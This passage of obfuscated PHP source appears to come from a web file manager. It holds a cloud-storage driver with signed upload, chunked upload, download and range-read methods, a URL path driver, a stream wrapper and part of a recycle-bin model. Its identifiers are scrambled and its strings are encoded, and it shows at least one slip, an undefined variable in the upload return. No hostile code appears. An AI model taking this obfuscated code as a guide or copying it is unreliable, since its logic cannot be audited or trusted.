($ÑéÏîê¸ < $†ı§´ƒå) { break; } continue; } if ($­ô´ÍŞ¾) { if ($–ˆ«ª«‡) { return !0; } } else { if ($Ú±Æñó») { return !0; } } if ($ÑéÏîê¸ < $†ı§´ƒå) { break; } } if ($à’ù„¦ò) { return array($áÒğ¶„Œ[242] => $ŞáĞÔ‚‡, $áÒğ¶„Œ[243] => $ş™ü‚ê); } return !1; } public function listAll($¯ªÎ¸£ª) { $œªìÂ ® =& $_SERVER[ıÚ˜š²İ]; $™Ş¡ü€ = $è¼–Ö§­ = array(); $this->fileList($¯ªÎ¸£ª, $™Ş¡ü€, $è¼–Ö§­, !0); $…†š±¬ = array_to_keyvalue($è¼–Ö§­, $œªìÂ ®[32]); foreach ($™Ş¡ü€ as $¸Ô¯íá) { if (is_string($¸Ô¯íá)) { $…†š±¬[$¸Ô¯íá] = array($œªìÂ ®[79] => 0); } } return $this->listAllFiles($¯ªÎ¸£ª, $…†š±¬); } public function canRead($¹‹› ìƒ) { return $this->exist($¹‹› ìƒ) ? !0 : !1; } public function canWrite($¯Ñ·¾ç‚) { return $this->exist($¯Ñ·¾ç‚) ? !0 : !1; } public function getContent($£÷ı“íş) { return $this->fileSubstr($£÷ı“íş, 0, -1); } public function setContent($«ÜÕÁ˜, $‰›½²ªš = '') { $×Ë¾à˜ =& $_SERVER[ıÚ˜š²İ]; if (!$‰›½²ªš) { $Ö­¡Š…° = $this->ussRequest($«ÜÕÁ˜, $×Ë¾à˜[291]); return $Ö­¡Š…°[$×Ë¾à˜[1311]]; } $©ñ§ƒÓÖ = $this->tempFile($this->pathThis($«ÜÕÁ˜)); file_put_contents($©ñ§ƒÓÖ, $‰›½²ªš); if ($this->upload($«ÜÕÁ˜, $©ñ§ƒÓÖ)) { $this->tempFileRemve($©ñ§ƒÓÖ); return !0; } return !1; } public function fileSubstr($Õ÷Ë÷Ãé, $¥ÅıÚ¬Æ, $å±îÉ­) { $Ò¹ßÕß‘ =& $_SERVER[ıÚ˜š²İ]; if (!($ĞóÔš¼Û = $this->link($Õ÷Ë÷Ãé))) { return !1; } $¹‡‡ÈˆÅ = !1; if ($å±îÉ­ > 0) { $¿Å„ØÀ™ = $¥ÅıÚ¬Æ + $å±îÉ­ - 1; $¹‡‡ÈˆÅ = array($Ò¹ßÕß‘[1556] . $¥ÅıÚ¬Æ . $Ò¹ßÕß‘[464] . $¿Å„ØÀ™); } $ıï™ãÎÏ = url_request($ĞóÔš¼Û, $Ò¹ßÕß‘[1517], !1, $¹‡‡ÈˆÅ); return $ıï™ãÎÏ[$Ò¹ßÕß‘[826]] ? $ıï™ãÎÏ[$Ò¹ßÕß‘[1301]] : !1; } public function upload($ãÊœµœ±, $‰ë·Üæƒ, $÷ôŠÔñÀ = false, $äŠ±ÅÛ = REPEAT_REPLACE) { $ˆ’ó’õ =& $_SERVER[ıÚ˜š²İ]; $éçÃ†şº = IO::size($‰ë·Üæƒ); if ($éçÃ†şº <= 1024 * 1024 * 200) { $ŠÃ¤¹¶¾ = array($ˆ’ó’õ[1598] . $‰ë·Üæƒ); $ãÉæÊÔÉ = $this->ussRequest($ãÊœµœ±, $ˆ’ó’õ[256], $ŠÃ¤¹¶¾); return $ãÉæÊÔÉ[$ˆ’ó’õ[1311]] ? $this->getPathOuter($ãÊœµœ±) : !1; } $Â«›È² = 1024 * 1024 * 10; $§‚Ëˆ… = array($ˆ’ó’õ[1599], $ˆ’ó’õ[1600] . $éçÃ†şº, $ˆ’ó’õ[1601], $ˆ’ó’õ[1602] . $Â«›È²); $ãÉæÊÔÉ = $this->ussRequest($ãÊœµœ±, $ˆ’ó’õ[256], !1, $§‚Ëˆ…); if (!$ãÉæÊÔÉ[$ˆ’ó’õ[1311]]) { return !1; } $ÎËæıñ” = $ãÉæÊÔÉ[$ˆ’ó’õ[1301]]; $ó…­õ¨‚ = 0; $¦Ç¢ğñû = $ÎËæıñ”[$ˆ’ó’õ[1603]]; $º÷†¹®‡ = fopen($‰ë·Üæƒ, $ˆ’ó’õ[1480]); if (!$º÷†¹®‡) { return !1; } do { $·Í½Ê¼Ç = $ÎËæıñ”[$ˆ’ó’õ[1604]]; fseek_64($º÷†¹®‡, $ó…­õ¨‚); $Ùéë­õ² = fread($º÷†¹®‡, $·Í½Ê¼Ç); $™ ì´Ô§ = 0; do { $™ ì´Ô§++; $ÎËæıñ” = $this->uploadPart($ãÊœµœ±, $ÎËæıñ”, $Ùéë­õ²); } while (!$ÎËæıñ” && $™ ì´Ô§ < 3); if (!$ÎËæıñ”) { return !1; } $¦Ç¢ğñû = $ÎËæıñ”[$ˆ’ó’õ[1603]]; $ó…­õ¨‚ += $·Í½Ê¼Ç; } while ($¦Ç¢ğñû != -1); fclose($º÷†¹®‡); $§‚Ëˆ… = array($ˆ’ó’õ[1605], $ˆ’ó’õ[1606] . $ÎËæıñ”[$ˆ’ó’õ[1607]], $ˆ’ó’õ[1601]); $ãÉæÊÔÉ = $this->ussRequest($ãÊœµœ±, $ˆ’ó’õ[256], !1, $§‚Ëˆ…); return $ãÉæÊÔÉ[$ˆ’ó’õ[1311]] ? $this->getPathOuter($“É¤îŞü) : !1; } private function uploadPart($ù‹˜îˆÜ, $íÎâ‰Ä”, &$Ä‰¿©İ‘) { $ÑäŒ†È =& $_SERVER[ıÚ˜š²İ]; $¾Æ‡¤÷ = array($ÑäŒ†È[1608], $ÑäŒ†È[1606] . $íÎâ‰Ä”[$ÑäŒ†È[1607]], $ÑäŒ†È[1609] . $íÎâ‰Ä”[$ÑäŒ†È[1603]], $ÑäŒ†È[146] . $íÎâ‰Ä”[$ÑäŒ†È[1604]]); $£Åø¼÷ = $this->ussRequest($ù‹˜îˆÜ, $ÑäŒ†È[256], $Ä‰¿©İ‘, $¾Æ‡¤÷); return !$£Åø¼÷[$ÑäŒ†È[1311]] ? $£Åø¼÷[$ÑäŒ†È[1311]] : $£Åø¼÷[$ÑäŒ†È[1301]]; } public function uploadFormData($Ø›•»÷ó, $ ùñ¿•Ä = 3600) { return $this->uploadPolicy($Ø›•»÷ó, $ ùñ¿•Ä); } public function uploadMultiData($Ê¸šõ€, $£Î¸¬Ê¤ = 3600) { $¿¤Éõƒ× =& $_SERVER[ıÚ˜š²İ]; $×®—„¨„ = (int) $GLOBALS[$¿¤Éõƒ×[7]][$¿¤Éõƒ×[79]]; return $this->uploadPolicy($Ê¸šõ€, $£Î¸¬Ê¤, $×®—„¨„); } private function uploadPolicy($š²‘ğµ¸, $¥¯È†Ç = 3600, $ó×‘£‘ß = 0) { $ããĞø¥Ã =& $_SERVER[ıÚ˜š²İ]; $Ú¹¬İ = $ããĞø¥Ã[8] . $this->bucket; $•’ç²öÚ = gmdate($ããĞø¥Ã[1515]); $“‘˜å¬‘ = array($ããĞø¥Ã[1610] => $this->bucket, $ããĞø¥Ã[1611] => $š²‘ğµ¸, $ããĞø¥Ã[1612] => time() + $¥¯È†Ç, $ããĞø¥Ã[1613] => $•’ç²öÚ); if ($ó×‘£‘ß) { $“‘˜å¬‘[$ããĞø¥Ã[1500]] = $ó×‘£‘ß; } $‹É—­èÂ = base64_encode(json_encode($“‘˜å¬‘)); $µ¤Ï°”» = base64_encode(hash_hmac($ããĞø¥Ã[1567], "\x50\x4f\123\x54\46{$Ú¹¬İ}\x26{$•’ç²öÚ}\46{$‹É—­èÂ}", md5("{$this->userpass}"), !0)); $õ‚Ì·÷ = array($ããĞø¥Ã[280] => $‹É—­èÂ, $ããĞø¥Ã[1614] => "\125\x50\x59\125\x4e\40{$this->username}\x3a{$µ¤Ï°”»}", $ããĞø¥Ã[209] => $this->endpoint . $Ú¹¬İ); return $õ‚Ì·÷; } public function download($¥Ñ¤–Öœ, $µï¢†š¥) { $…ñ°àÜÎ = IO::getPathInner(IO::mkfile($µï¢†š¥)); if (!($¸Èö¢¥¢ = $this->link($¥Ñ¤–Öœ))) { return !1; } $şËÄö³ = 0; $ƒë¨•Àœ = 1024 * 200; $†­¡½ª¶ = fopen($…ñ°àÜÎ, $_SERVER[ıÚ˜š²İ][1562]); while (!0) { $´–¬»²ƒ = $this->fileSubstr($¥Ñ¤–Öœ, $şËÄö³, $ƒë¨•Àœ); if ($´–¬»²ƒ === !1) { return !1; } fwrite($†­¡½ª¶, $´–¬»²ƒ); $şËÄö³ += $ƒë¨•Àœ; if (strlen($´–¬»²ƒ) < $ƒë¨•Àœ) { break; } } fclose($†­¡½ª¶); return $µï¢†š¥; } public function link($ÀâÓÚå, $Ğ™¦ìü‡ = array()) { $™ÖşÒı£ =& $_SERVER[ıÚ˜š²İ]; $ÀâÓÚå = trim($ÀâÓÚå, $™ÖşÒı£[8]); if (!empty($this->token)) { $”ö”µÔ± = strtotime(date($™ÖşÒı£[1615])); $¡òèÍ« = substr(md5($this->token . $™ÖşÒı£[287] . $”ö”µÔ± . $™ÖşÒı£[1616] . $ÀâÓÚå), 12, 8) . $”ö”µÔ±; $Ğ™¦ìü‡[] = $™ÖşÒı£[1617] . $¡òèÍ«; } $Ó°å”“ = !empty($Ğ™¦ìü‡) ? $™ÖşÒı£[76] . implode($™ÖşÒı£[287], $Ğ™¦ìü‡) : $™ÖşÒı£[12]; return $this->getHost() . $™ÖşÒı£[8] . $this->pathEncode($ÀâÓÚå) . $Ó°å”“; } public function fileOut($Ê”õöÙİ, $‘è—ÚÉ  = false, $Û®ÂÇƒ = false, $ÓÑÆŞÁÅ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ê”õöÙİ, $‘è—ÚÉ , $Û®ÂÇƒ, $ÓÑÆŞÁÅ); } if (!$Û®ÂÇƒ) { $Û®ÂÇƒ = $this->pathThis($Ê”õöÙİ); } $ŸßõÅƒÌ = $‘è—ÚÉ  ? array($_SERVER[ıÚ˜š²İ][1618] . rawurlencode($Û®ÂÇƒ)) : array(); $­–ŸÕî = $this->link($Ê”õöÙİ, $ŸßõÅƒÌ); $this->fileOutLink($­–ŸÕî); } public function fileOutServer($×¶ÚËûà, $ƒ«Ãñùö = false, $ëë‹Œ¶Ç = false, $òÆ¤¦à = '') { parent::fileOut($×¶ÚËûà, $ƒ«Ãñùö, $ëë‹Œ¶Ç, $òÆ¤¦à); } public function fileOutImage($÷Œùš ˜, $…Ëê¸åü = 250) { $û»ıƒÖ½ = $this->link($÷Œùš ˜ . $_SERVER[ıÚ˜š²İ][1619] . $…Ëê¸åü); $this->fileOutLink($û»ıƒÖ½); } public function fileOutImageServer($”œêº‰¥, $‘î«ˆœ = 250) { parent::fileOutImage($”œêº‰¥, $‘î«ˆœ); } public function hashMd5($áòòæ™Å) { $å‘Á…¼„ =& $_SERVER[ıÚ˜š²İ]; $–™°ŒËÅ = $this->_objectMeta($áòòæ™Å); return isset($–™°ŒËÅ[$å‘Á…¼„[248]]) ? $–™°ŒËÅ[$å‘Á…¼„[248]] : !1; } public function size($¦Œª‚ˆ) { $ğ€™ÔÕÊ = $this->objectMeta($¦Œª‚ˆ); return $ğ€™ÔÕÊ ? $ğ€™ÔÕÊ[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function info($±ÍÑøå¬) { if ($this->isFolder($±ÍÑøå¬)) { return $this->folderInfo($±ÍÑøå¬); } else { if ($this->isFile($±ÍÑøå¬)) { return $this->fileInfo($±ÍÑøå¬); } } return !1; } public function exist($¶§÷µÒ) { return $this->isFile($¶§÷µÒ) || $this->isFolder($¶§÷µÒ); } public function isFile($•¿ÂâÄ) { return !$this->isFolder($•¿ÂâÄ) && $this->objectMeta($•¿ÂâÄ); } public function isFolder($·‡Õ°ó) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][180], $·‡Õ°ó); } protected function objectMeta($¶ûõ¾öÖ) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][182], $¶ûõ¾öÖ); } protected function _objectMeta($óÔ¢“¬¯) { $¶öÂüø´ =& $_SERVER[ıÚ˜š²İ]; if ($óÔ¢“¬¯ == $¶öÂüø´[12] || $óÔ¢“¬¯ == $¶öÂüø´[8]) { return array(); } $Ş½§£Ñ½ = $this->ussRequest($óÔ¢“¬¯, $¶öÂüø´[1620]); if (!$Ş½§£Ñ½[$¶öÂüø´[1311]]) { return null; } $â¬¨”¦‰ = isset($Ş½§£Ñ½[$¶öÂüø´[1301]]) ? $Ş½§£Ñ½[$¶öÂüø´[1301]] : array(); if (!isset($â¬¨”¦‰[$¶öÂüø´[1621]])) { return null; } $×ÙÃÌ¥ù = array($¶öÂüø´[33] => isset($â¬¨”¦‰[$¶öÂüø´[1621]]) ? $â¬¨”¦‰[$¶öÂüø´[1621]] : null, $¶öÂüø´[79] => isset($â¬¨”¦‰[$¶öÂüø´[1622]]) ? $â¬¨”¦‰[$¶öÂüø´[1622]] : null, $¶öÂüø´[248] => isset($â¬¨”¦‰[$¶öÂüø´[1623]]) ? $â¬¨”¦‰[$¶öÂüø´[1623]] : null, $¶öÂüø´[1590] => isset($â¬¨”¦‰[$¶öÂüø´[1624]]) ? $â¬¨”¦‰[$¶öÂüø´[1624]] : null); $×ÙÃÌ¥ù[$¶öÂüø´[1591]] = isset($â¬¨”¦‰[$¶öÂüø´[1625]]) ? strtotime($â¬¨”¦‰[$¶öÂüø´[1625]]) : $×ÙÃÌ¥ù[$¶öÂüø´[1590]]; return $×ÙÃÌ¥ù; } protected function _isFolder($É›ù¶ˆ°) { $”ïÁ¯Ãè =& $_SERVER[ıÚ˜š²İ]; if ($É›ù¶ˆ° == $”ïÁ¯Ãè[12] || $É›ù¶ˆ° == $”ïÁ¯Ãè[8]) { return !0; } $—¿¹ûç = $this->_objectMeta($É›ù¶ˆ°); return isset($—¿¹ûç[$”ïÁ¯Ãè[33]]) && $—¿¹ûç[$”ïÁ¯Ãè[33]] == $”ïÁ¯Ãè[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÒÈ·´úÍ = false) { } public function exist($ì¿ç„ò) { $›ÊÎ¥§‹ = $this->info($ì¿ç„ò); return $›ÊÎ¥§‹[$_SERVER[ıÚ˜š²İ][235]]; } public function isFile($ÊøŸÓ»İ) { $àµÅÁš = $this->info($ÊøŸÓ»İ); return $àµÅÁš[$_SERVER[ıÚ˜š²İ][235]]; } public function isFolder($»€ªâ¥) { return !1; } public function size($¼êÁüØÜ) { $Ï ÍÅÅ = $this->info($¼êÁüØÜ); return $Ï ÍÅÅ[$_SERVER[ıÚ˜š²İ][79]]; } public function info($¦¾šüßš) { return $this->infoParse($¦¾šüßš); } public function infoAuth($€óªÍ½) { return $this->infoParse($€óªÍ½); } public function infoWithChildren($Œ’£šù°) { return $this->infoParse($Œ’£šù°); } public function infoFull($­ÊïÚÒå) { return $this->infoParse($­ÊïÚÒå); } private function infoParse($±™†°¶¬) { $¾„ôå‹˜ =& $_SERVER[ıÚ˜š²İ]; $ì×®¾“ = $this->header($±™†°¶¬); if (!$ì×®¾“ || !$ì×®¾“[$¾„ôå‹˜[826]]) { return !1; } $Ï´¼ñ»µ = _get($ì×®¾“, $¾„ôå‹˜[414], 0); $Œû×Ì¨µ = array($¾„ôå‹˜[32] => $ì×®¾“[$¾„ôå‹˜[32]], $¾„ôå‹˜[87] => $±™†°¶¬, $¾„ôå‹˜[33] => $¾„ôå‹˜[233], $¾„ôå‹˜[79] => intval($Ï´¼ñ»µ), $¾„ôå‹˜[169] => get_path_ext($ì×®¾“[$¾„ôå‹˜[32]]), $¾„ôå‹˜[1477] => $Ï´¼ñ»µ > 0 && $ì×®¾“[$¾„ôå‹˜[1626]], $¾„ôå‹˜[1478] => !1); return $Œû×Ì¨µ; } private function header($à¶”½ıÇ) { $¡‚¸‡­¿ =& $_SERVER[ıÚ˜š²İ]; if (isset(self::$_cacheHeader[$à¶”½ıÇ])) { return self::$_cacheHeader[$à¶”½ıÇ]; } $ñ¢¢»…± = isset($GLOBALS[$¡‚¸‡­¿[1627]]) ? $GLOBALS[$¡‚¸‡­¿[1627]] : !1; $GLOBALS[$¡‚¸‡­¿[1627]] = !0; self::$_cacheHeader[$à¶”½ıÇ] = url_header($à¶”½ıÇ); $GLOBALS[$¡‚¸‡­¿[1627]] = $ñ¢¢»…±; return self::$_cacheHeader[$à¶”½ıÇ]; } public function hashSimple($ü€¾İ˜, $ëóƒµ¿Ë = false) { $ø¹‘¹Ôü =& $_SERVER[ıÚ˜š²İ]; $’®ÆÅãÚ = $this->info($ü€¾İ˜); if (!$’®ÆÅãÚ || !$’®ÆÅãÚ[$ø¹‘¹Ôü[235]]) { return !1; } $¡ÕÙçÒÎ = $’®ÆÅãÚ[$ø¹‘¹Ôü[79]]; $ıšæ¸™ = 200; $¡Ä—ô‘ = 50; if ($¡ÕÙçÒÎ <= $ıšæ¸™ * $¡Ä—ô‘) { return md5($this->fileSubstr($ü€¾İ˜, 0, $¡ÕÙçÒÎ)) . $¡ÕÙçÒÎ; } $Úıëç¼– = intval($¡ÕÙçÒÎ / $¡Ä—ô‘); $Ï„˜Š´Ã = $ø¹‘¹Ôü[12]; $ÛÆªÚ× = timeFloat(); $é¬ğËÌĞ = 15; for ($ì¡À¾ş¶ = 0; $ì¡À¾ş¶ < $¡Ä—ô‘; $ì¡À¾ş¶++) { if (timeFloat() - $ÛÆªÚ× > $é¬ğËÌĞ) { return !1; } $éİ£Éğ = $this->fileSubstr($ü€¾İ˜, $Úıëç¼– * $ì¡À¾ş¶, $ıšæ¸™); if (!$éİ£Éğ) { return !1; } $Ï„˜Š´Ã .= $éİ£Éğ; } $Ï„˜Š´Ã .= $this->fileSubstr($ü€¾İ˜, $¡ÕÙçÒÎ - $ıšæ¸™, $ıšæ¸™); return md5($Ï„˜Š´Ã) . $¡ÕÙçÒÎ; } public function getContent($…”ê«„) { return $this->fileSubstr($…”ê«„); } public function fileSubstr($·â¿Ûú¬, $å˜İ‚è = 0, $ø¼˜©“ = -1) { $ÆÓ–Œ¨‰ =& $_SERVER[ıÚ˜š²İ]; $‘”ÊªÃ¾ = $this->info($·â¿Ûú¬); if (!$‘”ÊªÃ¾ || !$‘”ÊªÃ¾[$ÆÓ–Œ¨‰[235]] && $‘”ÊªÃ¾[$ÆÓ–Œ¨‰[79]] > 1024 * 1024 * 10) { return !1; } if ($ø¼˜©“ === -1) { $ø¼˜©“ = $‘”ÊªÃ¾[$ÆÓ–Œ¨‰[79]]; } if ($ø¼˜©“ == 0) { return $ÆÓ–Œ¨‰[12]; } $½ùÌŠš“ = array($ÆÓ–Œ¨‰[1628] . $å˜İ‚è . $ÆÓ–Œ¨‰[864] . ($å˜İ‚è + $ø¼˜©“ - 1)); $Ñ¿ÃÖõ = url_request($·â¿Ûú¬, $ÆÓ–Œ¨‰[1517], !1, $½ùÌŠš“, !1, !1, 30); return $Ñ¿ÃÖõ[$ÆÓ–Œ¨‰[1301]] ? $Ñ¿ÃÖõ[$ÆÓ–Œ¨‰[1301]] : $ÆÓ–Œ¨‰[12]; } public function download($âé‰¤¾, $½½Îœ‹ç) { Downloader::start($âé‰¤¾, $½½Îœ‹ç); return $½½Îœ‹ç; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ó¾…Ëİ, $í¡»‹¼ = '') { $this->info = $this->info($ó¾…Ëİ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ıÚ˜š²İ][87]]; $this->pathOpen = $ó¾…Ëİ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ó¾…Ëİ])) { self::$_chunkBuffer[$ó¾…Ëİ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($şÓ²„ó) { $šš‘ğÓÂ = $this->fileSubstr($this->pose, $şÓ²„ó); $this->pose += strlen($šš‘ğÓÂ); return $šš‘ğÓÂ; } public function stream_tell() { return $this->pose; } public function stream_seek($şàÀ·½³, $İæöë²) { $Ş¶Š„¯œ =& $_SERVER[ıÚ˜š²İ]; if ($İæöë² == SEEK_SET) { $this->pose = $şàÀ·½³; } else { if ($İæöë² == SEEK_CUR) { $this->pose += $şàÀ·½³; } else { if ($İæöë² == SEEK_END) { $this->pose = $this->info[$Ş¶Š„¯œ[79]] + intval($şàÀ·½³); } } } if ($şàÀ·½³ < 0) { $this->pose = $this->info[$Ş¶Š„¯œ[79]] + $şàÀ·½³; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ıÚ˜š²İ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÀßÇğÔì, $¡Î™¥³») { $Ü Øô‚ñ =& $_SERVER[ıÚ˜š²İ]; $Á¼©êöÉ = $this->info($ÀßÇğÔì); return array($Ü Øô‚ñ[1421] => 0, $Ü Øô‚ñ[1629] => 0, $Ü Øô‚ñ[16] => 32768 + 511, $Ü Øô‚ñ[1630] => 0, $Ü Øô‚ñ[1631] => 0, $Ü Øô‚ñ[1632] => 0, $Ü Øô‚ñ[1633] => 0, $Ü Øô‚ñ[79] => $Á¼©êöÉ[$Ü Øô‚ñ[79]], $Ü Øô‚ñ[1634] => $Á¼©êöÉ[$Ü Øô‚ñ[1476]], $Ü Øô‚ñ[1591] => $Á¼©êöÉ[$Ü Øô‚ñ[88]], $Ü Øô‚ñ[1590] => $Á¼©êöÉ[$Ü Øô‚ñ[234]], $Ü Øô‚ñ[1635] => 0, $Ü Øô‚ñ[1636] => 0); } static $fileInfo = array(); public function info($ÚâôÍÁ) { $õÏ”êûŠ = $_SERVER[ıÚ˜š²İ][1637]; if (isset(self::$fileInfo[$ÚâôÍÁ])) { return self::$fileInfo[$ÚâôÍÁ]; } if (substr($ÚâôÍÁ, 0, strlen($õÏ”êûŠ)) != $õÏ”êûŠ) { return !1; } self::$fileInfo[$ÚâôÍÁ] = IO::info(substr($ÚâôÍÁ, strlen($õÏ”êûŠ))); return self::$fileInfo[$ÚâôÍÁ]; } public static function read($˜ãòà”­, $ŸÀ€ñ²Å, $¯ŸåÎó¯) { if (!isset(self::$_fopenCache[$˜ãòà”­])) { $ëˆÂ©”» = new StreamWrapperIO(); $ëˆÂ©”»->stream_open($˜ãòà”­); self::$_fopenCache[$˜ãòà”­] = $ëˆÂ©”»; } $ëˆÂ©”» = self::$_fopenCache[$˜ãòà”­]; return $ëˆÂ©”»->fileSubstr($ŸÀ€ñ²Å, $¯ŸåÎó¯); } public static function _read($°É”Íê£, $ÎÖù’¡÷, $×¡²úµĞ) { $öÇÑ»•À =& $_SERVER[ıÚ˜š²İ]; $Ãíù¶Ğ¥ = fopen($°É”Íê£, $öÇÑ»•À[1480]); if (!$Ãíù¶Ğ¥) { return $öÇÑ»•À[12]; } $ä·œ€  = 8192; fseek($Ãíù¶Ğ¥, $ÎÖù’¡÷, SEEK_SET); $Ò°¾—À§ = $öÇÑ»•À[12]; $Îêõ¡†ß = 0; while ($Îêõ¡†ß < $×¡²úµĞ) { $—ÂøİÍ = min($ä·œ€ , $×¡²úµĞ - $Îêõ¡†ß); $Ò°¾—À§ .= fread($Ãíù¶Ğ¥, $—ÂøİÍ); $Îêõ¡†ß += $—ÂøİÍ; } fclose($Ãíù¶Ğ¥); return $Ò°¾—À§; } public function fileSubstr($Ïºàë›¸, $¢•¥‹š¡) { $‰êšÖæ =& $_SERVER[ıÚ˜š²İ]; $æîÑôªú = $this->info[$‰êšÖæ[79]]; $×³¤œÈÂ = $Ïºàë›¸; $“ûÕ§Õ³ = $¢•¥‹š¡; if ($Ïºàë›¸ < 0) { $Ïºàë›¸ = $æîÑôªú + $Ïºàë›¸; } if ($¢•¥‹š¡ === !1) { $¢•¥‹š¡ = $æîÑôªú - $Ïºàë›¸; } if ($Ïºàë›¸ + $¢•¥‹š¡ > $æîÑôªú) { $¢•¥‹š¡ = $æîÑôªú - $Ïºàë›¸; } if ($¢•¥‹š¡ <= 0) { return $‰êšÖæ[12]; } if ($Ïºàë›¸ < 0 || $Ïºàë›¸ >= $æîÑôªú || $¢•¥‹š¡ <= 0 || $¢•¥‹š¡ > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\x69\154\145\x52\x65\x61\x64\40\x65\x72\162\157\x72\x21\40\163\x74\141\162\x74\x3d{$Ïºàë›¸}\73\x6c\145\x6e\x67\x74\x68\x3d{$¢•¥‹š¡}\x3b\x20\163\x69\x7a\145\75{$æîÑôªú}\73"); } $ñîñ¦ì¨ = 64 * 1024; $ÏÃ­¢”¢ =& self::$_chunkBuffer[$this->path]; if (!$ÏÃ­¢”¢) { $ÏÃ­¢”¢ = array(); } $ÁÅªšä¡ = 0; $Šœí…‚ü = 0; $ØÃ¢à®€ = $‰êšÖæ[12]; foreach ($ÏÃ­¢”¢ as $ÁÅªšä¡ => $ØÃ¢à®€) { $ÁÅªšä¡ = intval($ÁÅªšä¡); $Šœí…‚ü = $ÁÅªšä¡ + strlen($ØÃ¢à®€); if ($Ïºàë›¸ >= $Šœí…‚ü) { continue; } if ($Ïºàë›¸ >= $ÁÅªšä¡ && $Ïºàë›¸ + $¢•¥‹š¡ <= $Šœí…‚ü) { return substr($ØÃ¢à®€, $Ïºàë›¸ - $ÁÅªšä¡, $¢•¥‹š¡); } break; } if (count($ÏÃ­¢”¢) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‰êšÖæ[1638], $‰êšÖæ[1639] . count($ÏÃ­¢”¢) . "\73\163\x74\x61\x72\x74\75{$Ïºàë›¸}\x2c\x6c\145\x6e\x67\x74\x68\x3d{$¢•¥‹š¡}\73\x70\x6f\163\145\x3a{$ÁÅªšä¡}\176{$Šœí…‚ü}"); throw new Exception($‰êšÖæ[1640]); } $Î…Ì‡ùÏ = intval($Ïºàë›¸ / $ñîñ¦ì¨) * $ñîñ¦ì¨; $Äì½ÍÖ‹ = ceil(($Ïºàë›¸ + $¢•¥‹š¡) / $ñîñ¦ì¨) * $ñîñ¦ì¨ - $Î…Ì‡ùÏ; $÷İíÔ†¾ = IO::fileSubstr($this->path, $Î…Ì‡ùÏ, $Äì½ÍÖ‹); $ÏÃ­¢”¢[$Î…Ì‡ùÏ . $‰êšÖæ[12]] = $÷İíÔ†¾; ksort($ÏÃ­¢”¢); $÷·–ñä³ = substr($÷İíÔ†¾, $Ïºàë›¸ - $Î…Ì‡ùÏ, $¢•¥‹š¡); return $÷·–ñä³; } private function log($òöŸ‡‘©, $ìßãåÃ…) { $´¾¾¼ìµ =& $_SERVER[ıÚ˜š²İ]; $¶Îûô„´ = timeFloat() - $this->timeStart; write_log(sprintf($´¾¾¼ìµ[1641], $òöŸ‡‘©, $this->info[$´¾¾¼ìµ[32]], $¶Îûô„´, $ìßãåÃ…), $´¾¾¼ìµ[1278]); } } goto fæÒô‡´£; B’’¨É¡“â: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\x65\x5f\162\x65\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\x6d\145", "\x74\151\x6d\x65", "\151\156\x73\145\162\164", "\146\165\156\143\x74\x69\x6f\156")); public function listData($æÄè¤Æ  = false) { $•’çãÕ¯ =& $_SERVER[ıÚ˜š²İ]; $æÄè¤Æ  = $æÄè¤Æ  ? $æÄè¤Æ  : USER_ID; $Î£¨µÒ’ = $this->where(array($•’çãÕ¯[1783] => $æÄè¤Æ ))->select(); return array_to_keyvalue($Î£¨µÒ’, $•’çãÕ¯[12], $•’çãÕ¯[194]); } public function moveToRecycle($×›¯Çô) { $ñì¿Ëê¾ =& $_SERVER[ıÚ˜š²İ]; $¦ÆÉéˆÑ = Model($ñì¿Ëê¾[1442]); $ù§¹Êú• = $¦ÆÉéˆÑ->sourceInfo($×›¯Çô); if (!$ù§¹Êú• || $ù§¹Êú•[$ñì¿Ëê¾[507]] == $ñì¿Ëê¾[91]) { return; } $Ğ¬¼€Ø = array($ñì¿Ëê¾[493] => $×›¯Çô, $ñì¿Ëê¾[1783] => USER_ID, $ñì¿Ëê¾[655] => $ù§¹Êú•[$ñì¿Ëê¾[191]], $ñì¿Ëê¾[656] => $ù§¹Êú•[$ñì¿Ëê¾[573]], $ñì¿Ëê¾[659] => $ù§¹Êú•[$ñì¿Ëê¾[588]]); $this->add($Ğ¬¼€Ø); $this->recycleMove($×›¯Çô, 1); if ($ù§¹Êú•[$ñì¿Ëê¾[487]] == $ñì¿Ëê¾[91]) { $¬àÈÑÉ = array($ñì¿Ëê¾[659] => array($ñì¿Ëê¾[619], $ù§¹Êú•[$ñì¿Ëê¾[588]] . $×›¯Çô . $ñì¿Ëê¾[620])); $¦ÆÉéˆÑ->where($¬àÈÑÉ)->setField($ñì¿Ëê¾[507], 1); } } public function clear() { $this->remove(!1); } public function remove($Œå¶£ï¥ = false, $Ë‚‹ùÎ = false) { $–Ò¦îŸ­ =& $_SERVER[ıÚ˜š²İ]; $Ë‚‹ùÎ = $Ë‚‹ùÎ ? $Ë‚‹ùÎ : USER_ID; $œ´ÂÆñ = Model($–Ò¦îŸ­[1442]); $‚•Îü«’ = $this->listData($Ë‚‹ùÎ); $Œå¶£ï¥ = $Œå¶£ï¥ === !1 ? !1 : $Œå¶£ï¥; $ë‚‚¦¾’ = array(); foreach ($‚•Îü«’ as $‚º«šóÊ) { if ($Œå¶£ï¥ != !1 && !in_array($‚º«šóÊ, $Œå¶£ï¥)) { continue; } $¤ê’±‡® = $œ´ÂÆñ->sourceInfo($‚º«šóÊ); $œ´ÂÆñ->remove($‚º«šóÊ, !1); $ø³Ëõ¿ò = $¤ê’±‡®[$–Ò¦îŸ­[191]] . $–Ò¦îŸ­[11] . $¤ê’±‡®[$–Ò¦îŸ­[573]]; 